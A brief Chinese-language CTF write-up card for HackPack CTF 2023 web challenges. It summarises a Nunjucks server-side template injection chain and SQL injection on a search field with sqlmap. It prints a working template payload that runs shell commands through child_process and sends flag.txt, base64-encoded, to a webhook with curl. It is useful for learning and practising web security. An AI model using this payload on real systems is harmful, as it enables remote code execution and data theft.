---
title: "HackPack CTF 2023 WP"
category: web
tags: ["HackPack CTF 2023", "web", "web", "ssti", "nunjucks", "jinja"]
signals: ["HackPack CTF 2023 2023", "web", "ssti", "nunjucks", "jinja", "jwt", "sqli", "dora", "rce", "web_unknown", "HackPack", "Nunjucks", "SSTI", "SQL"]
difficulty: medium
source: "https://www.ctfiot.com/110853.html"
tools: ["curl", "sqlmap"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# HackPack CTF 2023 WP

> 赛事：HackPack CTF 2023 2023 | 方向：web | 难度：medium | 工具：curl、sqlmap

## 一句话总结

HackPack 2023：Nunjucks SSTI外带+SQL注入双引号闭合

## 攻击链

1. issue-tracker SSTI: {{process.mainModule.require(''child_process'').exec(''curl webhook'')}}
2. 添加payload到 issue 标题/描述
3. webhook: cat flag.txt | base64 → curl
4. WolfHowl: 搜索框SQL注入双引号闭合
5. sqlmap 攻击 artist POST 参数
6. JWT/session 利用

## 关键 payload

```
{{process.mainModule.require(''child_process'').exec(''curl ...?$(cat flag.txt | base64)'')}}
```

## 经验教训

Nunjucks SSTI {{process.mainModule.require}}可执行命令

## 标签

web、ssti、nunjucks、jinja、jwt、sqli、dora、rce、sqlmap

## 参考来源

- https://www.ctfiot.com/110853.html
- 原文件：HackPack_CTF_2023_WP.full.md
